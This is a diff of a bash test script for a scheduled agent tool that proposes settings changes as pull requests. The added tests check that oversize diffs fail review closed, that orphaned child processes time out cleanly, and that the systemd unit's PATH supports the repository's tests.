+# A diff too long to show whole is not reviewed in part: no review, no PR.
+reset_all
+cfg max_findings=1
+AGENT_PROPOSE_REVIEW_DIFF_MAX=200 run 0 run --window weekly
+[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "failed,review_failed" ] || fail "an oversize diff must fail the review closed" "$(cat "$out" "$err")"
+[ "$(calls)" = 1 ] || fail "a truncated diff was sent for review"
+no_pr "oversize diff"
+# A killed call whose grandchild still holds the pipe does not hang the run.
+reset_all
+cfg max_findings=1
+echo orphan >"$stub/mode/unused-plugin_caveman"
+started=$SECONDS
+run 0 run --window weekly
+[ $((SECONDS - started)) -lt 20 ] || fail "the run waited on a pipe a detached grandchild held"
+[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "failed,timeout" ] || fail "orphan timeout status" "$(cat "$out")"
+
 # ── systemd units ──
 units="$here/home/dot_config/systemd/user"
 trigger="$here/home/run_onchange_57-enable-agent-propose.sh.tmpl"
@@ -1161,6 +1344,36 @@ done
 if command -v systemd-analyze >/dev/null 2>&1; then
     systemd-analyze verify --user "$svc" 2>&1 | grep -i "agent-propose" | grep -iv "no such file\|not-found" && fail "systemd rejects the service" || true
 fi
+
+# The unit's PATH must find what the repo's tests need: chezmoi in ~/bin and the
+# managed Node ahead of the distribution's. The tool's own test step is run
+# here under exactly that line.
+unit_path="$(sed -n 's/^Environment=PATH=//p' "$svc" | sed "s|%h|$fx|g")"
+[ -n "$unit_path" ] || fail "no PATH line in the service"
+reset_all
+cfg max_findings=1
+mkdir -p "$fx/bin" "$fx/.local/bin" "$fx/.local/npm-bin"
+cp "$tmp/bin/claude" "$tmp/bin/gh" "$fx/.local/bin/"
+printf '#!/bin/sh\nexit 0\n' | tee "$fx/bin/chezmoi" >"$fx/.local/npm-bin/node"
+chmod +x "$fx/bin/chezmoi" "$fx/.local/npm-bin/node"
+(
+    cd "$target"
+    cat >tests/scripts/test_toolchain.sh <<'EOF'
+#!/usr/bin/env bash
+# Runs for an edit to modify_settings.json.json.tmpl, as the repo's own
+# settings test does, and needs the same tools.
+command -v chezmoi >/dev/null || exit 1
+[ "$(command -v node)" = "$HOME/.local/npm-bin/node" ]
+EOF
+    git add -A && git commit -q -m "a test that needs the toolchain" && git push -q
+)
+PATH="$unit_path" run 0 run --window weekly
+[ "$(field result)" = proposed ] || fail "under the unit's PATH the repo's tests do not pass, so no settings edit could ship" "$(cat "$out" "$err")"
+reset_store
+reset_stub
+gt push -q origin --delete "$branch"
+PATH="$fx/.local/bin:/usr/local/bin:/usr/bin:/bin" run 0 run --window weekly
+[ "$(field stopped)" = baseline-tests ] || fail "the PATH check proves nothing: the tests pass without the toolchain dirs" "$(cat "$out" "$err")"
 
 # ── Trigger: stubbed systemctl/loginctl ──
 shellcheck -s bash "$trigger"
